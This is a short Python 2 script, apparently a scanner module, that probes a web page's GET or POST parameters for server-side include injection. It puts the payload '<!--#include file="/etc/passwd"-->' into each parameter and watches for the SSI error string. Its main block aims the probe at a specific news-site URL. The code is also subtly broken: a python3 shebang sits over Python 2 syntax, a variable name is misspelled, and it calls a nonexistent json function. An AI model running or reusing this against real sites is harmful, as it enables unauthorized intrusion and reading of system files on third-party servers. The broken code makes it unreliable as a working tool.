#!/usr/bin/python3  
# -*- coding: utf-8 -*-  
import urllib  
import json  
  
def run(url,method,params):  
    try:  
        if method == 'get':  #year1=20120923&year2=20130923  
            params_dict = None  
            try:  
                params_dict = dict(map(lambda s: s.split('='),params.split('&')))  #params may "&page=&no=3249"  
            except:  
                return  
            for row in params_dict:  
                tmp = params_dict.copy()  
                tmp[row] = '<!--#include%20file="/etc/passwd"-->'  
                ret = []  
                for k in tmp:  
                    ret.append(k+"="+tmp[k])  
                new_url = "%s?%s" %(url, '&'.join(ret))  
                opener = urllib.urlopen(new_url)  
                content = opener.read()  
                opener.close()  
                if content.find("[an error occurred while processing this directive]") >= 0:  
                    res = opener.headers.dict  
                    res['status']='403'  
                    print 'bingo',new_url,content  
                    break  
        elif method == 'post': #[{"type":"hidden","name":"num","value":""},{"type":"hidden","name":"asu","value":""}]  
            params_list = json.read(params)  
            params = []  
            for params_dict in params_list:  
                params.append((params_dict['name'],params_dict['value']))  
            params_dict = dict(params)  
            for row in params_dict:  
                tmp = params_dict.copy()  
                tmp[row] = '<!--#include file="/etc/passwd"-->'  
                data = urllib.urlencode(tmp)  
                opener = urllib.urlopen(url,data)  
                content = opener.read()  
                opener.close()  
                if content.find("[an error occurred while processing this directive]") >= 0:  
                    res = opener.headers.dict  
                    res['status']='403'  
                    print 'bingo',url,data,contet  
                    break  
    except Exception,e:  
        print str(e)  
  
if __name__ == '__main__':  
    run('http://hpc.ebn.co.kr/news/n_view.html','get','id=630432&kind=menu_code&keys=70')  